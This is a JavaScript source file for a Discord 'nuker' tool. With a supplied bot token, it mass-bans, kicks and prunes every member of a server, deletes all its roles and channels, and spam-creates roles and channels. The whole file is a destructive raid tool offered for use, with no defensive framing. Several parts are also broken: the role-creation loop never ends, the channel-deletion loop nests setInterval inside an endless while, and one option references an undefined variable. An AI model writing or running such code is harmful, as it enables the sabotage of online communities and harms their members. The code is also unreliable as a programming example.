const readline = require('readline')
const discord = require('discord.js')
const { magentaBright: main, red, white, blackBright } = require('chalk')
const { RichEmbed, Message } = require('discord.js')
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const client = new discord.Client();
// const { logo } = require('./logo')

function logo() {
console.log(' ')
console.log(white('╦  ═╗ ╦╔╦╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗'))
console.log(blackBright('║  ╔╩╦╝ ║ ║╣   ║║║║ ║╠╩╗║╣ ╠╦╝'))
console.log(main("╩═╝╩ ╚═ ╩ ╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═"))
console.log(' ')
console.log(main("╔═══════════════════╦═════════════════════╦═════════════════════╦"))
console.log(main("║ [")+white(1)+main('] ') + white('Ban members  ') + main(' ║ [')+white(4)+main('] ') + white('Create roles') + main('    ║ [') + white(7) + main(']') + white(' Delete channels') + main(' ║'))
console.log(main("║ [")+white(2)+main('] ') + white('Kick members ') + main(' ║ [')+white(5)+main('] ') + white('Nuker          ') + main(' ║ [') + white(8) + main(']') + white(' Create channels') + main(' ║'))
console.log(main("║ [")+white(3)+main('] ') + white('Prune members') + main(' ║ [')+white(6)+main('] ') + white('Delete roles') + main('    ║ [') + white(9) + main(']') + white(' Exit') + main('            ║'))
console.log(main('╚═══════════════════╩═════════════════════╩═════════════════════╩'))
}

rl.question(main('> ')+white('Enter token')+main(': '), (token) => {
      console.clear()
    logo();

  rl.question(main('> ') + white('Enter option:'), (optio) => {
    let option = Number(optio)

    if (option === 1) {
      rl.question(main('> ') + white('Enter server ID')+main(': '), (serverID) => {
        let server = client.guilds.get(serverID);


        for (member of server.members.values()) {
          // .values makes it the Collection iterable
          member.ban().then(() => {
            console.log(main('> ') + white('Banned ') + main(member.id))
          }).catch(() => {
            console.log(red('> ') + white('Failed to ban ') + main(member.id))
          })
        }

      })
    }
    if (option === 2) {
      rl.question(main('> ') + white('Enter server ID')+main(': '), (serverID) => {
        let server = client.guilds.get(serverID);


        for (member of server.members.values()) {
          // .values makes it the Collection iterable
          member.kick().then(() => {
            console.log(main('> ') + white('Kicked ') + main(member.id))
          }).catch(() => {
            console.log(red('> ') + white('Failed to kick ') + main(member.id))
          })
        }

      })
    }
    if (option === 3) {
      rl.question(main('> ') + white('Enter server ID')+main(': '), (serverID) => {
        const server = client.guilds.get(serverID)

        server.pruneMembers().then(() => {
          console.log(main('> ') + white('Successfully pruned ') + main(server.name))
        })
      })
    }
    if (option === 4) {
      rl.question(main('> ') + white('Enter Server ID') + main(': '), (serverID) => {
        const server = client.guilds.get(serverID)
        rl.question(main('> ') + white('Enter role names')+main(': '), (roleName) => {
          rl.question(main('> ') + white('Enter amount') + main(': '), (roleAmount) => {
            let amount = Number(roleAmount)

            let count = 0;

            while (count < amount) {
                  server.createRole({
                    name: roleName,
                    color: "RANDOM"
                  }).then((role) => {
                    console.log(main("> ") + white('Created role ') + white(role.name))
                  }).catch(() => {
                    console.log(red('> ') + white("Failed to create role"))
                  })
            }

          })
        })
      })
    }
    if (option === 5) {
      require('./nuker')(client, message)
    }
    if (option === 6) {
      rl.question(main('> ') + white('Enter server ID')+main(': '), (serverID) => {
        const server = client.guilds.get(serverID)

        server.roles.forEach((role, i) => {
          role.delete().then(() => {
            console.log(main('> ') + white('Deleted role ') + main(role.id))
          }).catch(() => {
            console.log(red('> ') + white('Failed to delete role ') + main(role.id))
          })
        });
      })
    }
    if (option === 7) {
      rl.question(main('> ') + white('Enter server ID')+main(': '), (serverID) => {
        const server = client.guilds.get(serverID)

        while (server.channels.size > 1) {
          setInterval(() => {
          server.channels.random().delete().then((c) => {
            console.log(main('> ') + white('Deleted channel ') + main(c.name))
          }).catch(() => {
            console.log(main("> ") + white('Failed to delete channel ') + main(c.name))
          })
        })
        }
      })
    }
    if (option === 8) {
      rl.question(main('> ') + white('Enter server ID')+main(': '), (serverID) => {
        const server = client.guilds.get(serverID)

        rl.question(main('> ') + white('Enter channel names')+main(': '), (chName) => {
          rl.question(main('> ') + white('Enter amount')+main(': '), (strAmount) => {
            let amount = Number(strAmount)

            for (let i = 0; i < amount; i++) {
              server.createChannel(chName, {
                topic: "Made by slayer"
              })
            }


          })
        })

      })
    }
    if (option === 9) {
      process.exit()
    }
  })

  // Decided to remove the function as I could not find the reason to the code being recursive


  client.login(token).catch(() => {
    return console.log(red('> ') + white('Incorrect token passed'))
  })
})
